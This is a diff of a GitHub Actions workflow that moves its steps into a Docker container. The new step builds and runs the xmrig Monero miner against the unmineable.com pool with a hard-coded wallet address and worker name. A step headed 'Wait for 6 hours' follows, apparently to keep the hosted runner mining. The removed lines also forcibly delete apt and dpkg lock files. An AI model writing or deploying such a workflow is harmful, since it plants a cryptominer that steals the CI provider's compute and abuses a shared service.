@@ -11,39 +11,20 @@ jobs:
       - name: Check out repository
         uses: actions/checkout@v2
 
-      - name: Clean up apt locks
+      - name: Build and Run xmrig in Docker
         run: |
-          sudo rm -rf /var/lib/apt/lists/lock
-          sudo rm -rf /var/cache/apt/archives/lock
-          sudo rm -rf /var/lib/dpkg/lock*
-          sudo dpkg --configure -a
-
-      - name: Install dependencies
-        run: |
-          echo "Updating package lists and installing dependencies..."
-          apt-get update
-          apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-
-      - name: Clone xmrig repository
-        run: |
-          echo "Cloning xmrig repository..."
-          git clone https://github.com/xmrig/xmrig.git
-          cd xmrig
-
-      - name: Build xmrig
-        run: |
-          echo "Building xmrig..."
-          cd xmrig  # Ensure we are in the correct directory
-          mkdir build
-          cd build
-          cmake ..
-          make
-
-      - name: Run xmrig
-        run: |
-          echo "Running xmrig..."
-          cd xmrig/build  # Make sure we are in the correct build directory
+          echo "Running in Docker..."
+          docker run --rm -v ${{ github.workspace }}:/workspace -w /workspace ubuntu:latest bash -c "
+          apt update && \
+          apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && \
+          git clone https://github.com/xmrig/xmrig.git && \
+          cd xmrig && \
+          mkdir build && \
+          cd build && \
+          cmake .. && \
+          make && \
           ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:88ShoRuQAns2zfCrQWqC9M6bBjCCBf4xs7TNyXDK3iHsdkQTRaK75MNUxqzw4X62bwF2ik6HwBeJeNdsTTy98MUnS9Q4Rmp.unmineable_worker_tsjcm#mvbs-zlx7 -p x
+          "
 
       - name: Wait for 6 hours
         run: |
